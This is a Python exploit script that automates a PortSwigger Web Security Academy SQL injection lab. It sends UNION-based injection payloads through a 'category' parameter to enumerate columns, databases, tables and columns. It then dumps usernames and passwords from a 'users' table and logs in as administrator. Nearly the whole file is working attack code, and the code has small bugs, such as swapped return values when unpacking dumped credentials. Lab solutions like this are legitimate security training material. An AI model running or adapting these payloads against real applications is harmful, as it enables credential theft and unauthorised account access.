#!/usr/bin/python3

from time import sleep
import re
import sys
import logging
import argparse
import urllib3
import urllib.parse
import urllib.request

from prettytable import PrettyTable
from colorama import Fore, Style
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format=Fore.BLUE + "[{asctime}] {message}",
    style="{",
    datefmt= Fore.BLUE + "%H:%M:%S",
)

def normalize_url(url):
    if not url.endswith("/"): 
        url = url + "/"
    return url

def is_url_reachable(url):
    try:
        urllib.request.urlopen(url)
        return True
    except:
        return False
    
def check_if_already_been_solved(url) :
    response = requests.get(url, verify=False)
    if "Congratulations, you solved the lab!" in response.text:
        print("\n")
        log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.YELLOW + " The Lab has already been solved !!" + "\n" + Fore.WHITE)
        sys.exit(0)

def send_payload(url, uri, payload, no_proxy) :
    if no_proxy:
        r = requests.get(url + uri + payload, verify=False)
    else:
        r = requests.get(url + uri + payload, verify=False, proxies=PROXIES)

def check_response_code(url, uri, payload, no_proxy):
    if no_proxy:
        resp = requests.get(url + uri + payload)
    else:
        resp = requests.get(url + uri + payload, proxies=PROXIES, verify=False)
    
    return resp.status_code

def get_number_column(url, uri, no_proxy) : 
    columns = 1 
    while True:
        payload = "'+UNION+SELECT+" + "NULL,"*(columns-1) + "NULL--"
        log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
        send_payload(url, uri, payload, no_proxy)

        if check_response_code(url, uri, payload, no_proxy) == 500 :
            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]"  + Fore.RED + " Failed!!" + Fore.WHITE + " Incrementing the number of NULL values")
            columns +=1
            if (columns >= 10) : 
                log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " The number of columns exceed what's in the database !")
                sys.exit(-1)

        elif check_response_code(url, uri, payload, no_proxy) == 200 :
            return columns
        
        else :
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Something went wrong :(")
            sys.exit(-1)

def get_string_column(url, uri, number_columns, no_proxy) :
    columns_list = [0] * number_columns    

    for i in range(number_columns) :
        null_count = number_columns -i -1
        nulls = "NULL," * null_count
        payload = "'+UNION+SELECT+" + nulls + "'a'" + ",NULL" * i + "--"   # Payload to find columns that contains string data
        log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
        send_payload(url, uri, payload, no_proxy)
        if check_response_code(url, uri, payload, no_proxy) == 200 :
            columns_list[i] = 1

    return columns_list     # This is a list

def get_db_version(url, uri, columns_string, no_proxy) :
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            null_count = len(columns_string) -i -1
            nulls = "NULL," * null_count
            payload = "'+UNION+SELECT+" + nulls + "version()" + ",NULL" * i + "--"      # Payload to get the version of the database
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
            if (no_proxy) : 
                resp = requests.get(url + uri + payload, verify=False)
            else: 
                resp =requests.get(url + uri + payload, verify=False, proxies=PROXIES)

            pattern = r"<td>(.+?)</td>"
            db_version = re.search(pattern, resp.text).group(1)
            break
        else :
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to get the database version :(")
    
    return db_version

def get_current_db_name(url, uri, columns_string, no_proxy) :       # Payload: '+UNION+SELECT+NULL,current_database()--    
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            null_count = len(columns_string) -i -1
            nulls = "NULL," * null_count
            payload = "'+UNION+SELECT+" + nulls + "current_database()" + ",NULL" * i + "--"      # Payload to get the current db name 
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
            if (no_proxy) : 
                resp = requests.get(url + uri + payload, verify=False)
            else: 
                resp =requests.get(url + uri + payload, verify=False, proxies=PROXIES)

            pattern = r"<td>(.+?)</td>"
            current_db_name = re.search(pattern, resp.text).group(1)
            break

        else: 
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to get the current database name :(")

    return current_db_name

def get_all_dbs_names(url, uri, columns_string, no_proxy) :         # Payload: '+UNION+SELECT+NULL,datname+FROM+pg_database--
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            null_count = len(columns_string) -i -1
            nulls = "NULL," * null_count
            payload = "'+UNION+SELECT+" + nulls + "datname+" + ",NULL" * i + "FROM+pg_database--"     # Payload to get the names of the available databases
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
            if (no_proxy) : 
                resp = requests.get(url + uri + payload, verify=False)
            else: 
                resp =requests.get(url + uri + payload, verify=False, proxies=PROXIES)

            pattern = r"<td>(.+?)</td>"
            dbs_names = re.findall(pattern, resp.text)
            break

        else: 
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to get the names of the available databases :(")

    return dbs_names        # This will return a list. For example: dbs_names = ['template1', 'academy_labs', 'postgres', 'template0']

def get_tables(url, uri, columns_string, no_proxy) :            # Payload: '+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            null_count = len(columns_string) -i -1
            nulls = "NULL," * null_count
            payload = "'+UNION+SELECT+" + nulls + "table_name+" + ",NULL" * i + "FROM+information_schema.tables--"     # Payload to get the tables of the current db
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
            if (no_proxy) : 
                resp = requests.get(url + uri + payload, verify=False)
            else: 
                resp =requests.get(url + uri + payload, verify=False, proxies=PROXIES)

            pattern = r"<td>(.+?)</td>"
            tables_names = re.findall(pattern, resp.text)
            break

        else:
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to get the names of the available databases :(") 

    return tables_names    # This will return a list containing the tables names

def get_columns (url, uri, columns_string, tables_names, no_proxy) :          # Payload: '+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'--   
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            if ('users' in tables_names) :
                table_name = "'users'"
                null_count = len(columns_string) -i -1
                nulls = "NULL," * null_count
                payload = "'+UNION+SELECT+" + nulls + "column_name+" + ",NULL" * i + "FROM+information_schema.columns+WHERE+table_name=" + table_name + "--"     # Payload to get the columns of the 'users' table
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
                if (no_proxy) : 
                    resp = requests.get(url + uri + payload, verify=False)
                else: 
                    resp =requests.get(url + uri + payload, verify=False, proxies=PROXIES)

                pattern = r"<td>(.+?)</td>"
                columns_names = re.findall(pattern, resp.text)
                break
                
            else: 
                print("Could not find a table named 'users'")
                sys.exit(-1)

        else: 
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to get the tables of the current db :(") 
               
    return columns_names       

def dump_data(url, uri, columns_string, columns_names, no_proxy) :             # Payload: '+UNION+SELECT+username,password+FROM+users--    
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            null_count = len(columns_string) -i -1
            nulls = "NULL," * null_count
            usernames_payload = "'+UNION+SELECT+" + nulls + columns_names[0] + ",NULL" * i + "+FROM+users--"    # Payload to retrieve data from user's table 
            passwords_payload = "'+UNION+SELECT+" + nulls + columns_names[1] + ",NULL" * i + "+FROM+users--"
            if (no_proxy) : 
                resp1 = requests.get(url + uri + usernames_payload, verify=False)
                resp2 = requests.get(url + uri + passwords_payload, verify=False)
            else: 
                resp1 =requests.get(url + uri + usernames_payload, verify=False, proxies=PROXIES)
                resp2 =requests.get(url + uri + passwords_payload, verify=False, proxies=PROXIES)

            pattern = r"<td>(.+?)</td>"
            usernames = re.findall(pattern, resp1.text)
            passwords = re.findall(pattern, resp2.text)
            break
        
        else: 
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Something went wrong :(")
            sys.exit(-1)
    
    else: 
        log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to fetch the content of the table 'users' :(") 

    return usernames, passwords 

def get_CSRF_token(session, url, uri, no_proxy) :
    if (no_proxy) :
        response = session.get(url+uri)
    else:
        response = session.get(url+uri, proxies=PROXIES, verify=False)

    pattern = re.compile(r'name="csrf" value="(.*?)"')
    Token = pattern.search(response.text)
    return Token[1]

def login(url, uri, csrf, session, password, no_proxy) :
    POST_data = {
        "csrf": csrf,
        "username": "administrator",
        "password": password,
    }
    if (no_proxy) :
        resp = session.post(url + uri, data=POST_data, verify=False)
    else:
        resp = session.post(url + uri, data=POST_data, verify=False, proxies=PROXIES)

def get_password_index(usernames) :
    for i in range(len(usernames)) :
        if (usernames[i] == 'administrator') :
            return i

def is_solved(url, s, no_proxy):
    def Get_Response(s, url, no_proxy):
        if no_proxy:
            resp = s.get(url)
        else:
            resp = s.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            return True
        
    solved = Get_Response(s, url, no_proxy)
    if solved:
        return True
    else:
        sleep(2)
        Get_Response(s, url, no_proxy)

if __name__ == "__main__":
    
    try: 
        parser = argparse.ArgumentParser(description="Usage Example: python3 SQLi-Lab#2.py --url https://0a2100.web-security-academy.net/ --no-proxy")
        parser.add_argument("-u", "--url", help="Enter the Lab URL", required=True)
        parser.add_argument("-n", "--no-proxy", help="Do not use proxy", default=False, action="store_true")
        args = parser.parse_args()

        url = normalize_url(args.url)
        uri = "filter?category="
        login_uri = "login"
        session = requests.Session()

        banner = Style.BRIGHT + Fore.BLUE + f"""
{'-'*125}
# Platform          : Web Security Academy Portswigger			
# Web Vulnerability : SQL Injection
# Type              : Server-side
{'-'*125}
{'-'*125}
# Lab #5            : SQL injection UNION attack, retrieving data from other tables
# Lab Level         : Practitioner
# Link              : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
{'-'*125}
        """
        print(banner)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Target URL: " + url)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")

        check_if_already_been_solved(url)

        if is_url_reachable(url):
            
            # Detecting the SQL injection vulnerability: 
            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " GET parameter " + Fore.GREEN + 'category' + Fore.WHITE + " is vulnerable to SQLi UNION attacks")
            sleep(1)
            print("\n")

            # Number of columns: 
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Finding the number of columns ...")
            number_columns = get_number_column(url, uri, args.no_proxy)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The " + Fore.GREEN + "number " + Fore.WHITE + "of columns returned by the query is: " + Style.BRIGHT + Fore.CYAN + str(number_columns))
            print("\n")

            # Columns with string data:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Searching for columns containing string data ...")
            columns_string = get_string_column(url, uri, number_columns, args.no_proxy)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Found " + Style.BRIGHT + Fore.CYAN + str(len(columns_string)) + " columns" + Fore.WHITE + " containing string data" )
            print("\n")

            # Database version:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Fetching database version ...")
            version = get_db_version(url, uri, columns_string, args.no_proxy)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The backend DBMS is: " + Style.BRIGHT + Fore.CYAN + "PostgreSQL")
            sleep(1)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The database version is: " + Style.BRIGHT + Fore.CYAN + version)
            print("\n")

            # Current db name:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Fetching the current database name ...")
            current_db_name = get_current_db_name(url, uri, columns_string, args.no_proxy)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The current database name is: " + Style.BRIGHT + Fore.CYAN + current_db_name)
            print("\n")

            # Available databases:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Fetching available databases names ...")
            databases = get_all_dbs_names(url, uri, columns_string, args.no_proxy)
            dbs = PrettyTable()
            dbs.field_names = ["Available Databases"]
            for db in databases:
                dbs.add_row([db])
            print(dbs)
            print("\n")

            # Tables:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Fetching tables for database: "+ Fore.YELLOW + "academy_labs" + Fore.WHITE + " ...")
            tables_names = get_tables(url, uri, columns_string, args.no_proxy)
            tables = PrettyTable()
            tables.field_names = ["Tables of 'academy_labs' db"]
            for table in tables_names:
                tables.add_row([table])
            print(tables)
            print("\n")

            # Columns:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Fetching columns for table "+ Fore.YELLOW + "users" + Fore.WHITE + " in database: " + Fore.YELLOW + "academy_labs" + Fore.WHITE + " ...")
            columns_names = get_columns(url, uri, columns_string, tables_names, args.no_proxy)
            columns = PrettyTable()
            columns.field_names = ["Columns of table 'users'"]
            for column in columns_names:
                columns.add_row([column])
            print(columns)
            print("\n")

            # Dump data:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Dumping data from table "+ Fore.YELLOW + "users" + Fore.WHITE + " ...")
            passwords, usernames = dump_data(url, uri, columns_string, columns_names, args.no_proxy)
            data = PrettyTable()
            data.field_names = [columns_names[1], columns_names[0]]
            for i in range(len(usernames)) :
                data.add_row([usernames[i], passwords[i]])
            print(data)
            print("\n")

            # Login as administrator:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Logging  in as administrator ... " )

            for i in range(len(usernames)) :
                if(usernames[i] == 'administrator') :
                    password_index = i

            csrf_token = get_CSRF_token(session, url, login_uri, args.no_proxy) 
            login(url, login_uri, csrf_token, session, passwords[password_index], args.no_proxy)

            if is_solved(url, session, args.no_proxy) :
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Logged in successfully as administrator")
                print("\n")
                sleep(1)
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " SQL injection exploited successfully :)")
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !")
                print("\n")

        else: 
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check that the provided target URL is reachable.")
            sys.exit(-1)

    except KeyboardInterrupt:
        print("\n")
        log.info(Fore.RED + "[-] The exploit has been INTERRUPTED !")

    except Exception as e:
        log.info(Fore.RED + "[-] " + str(e))
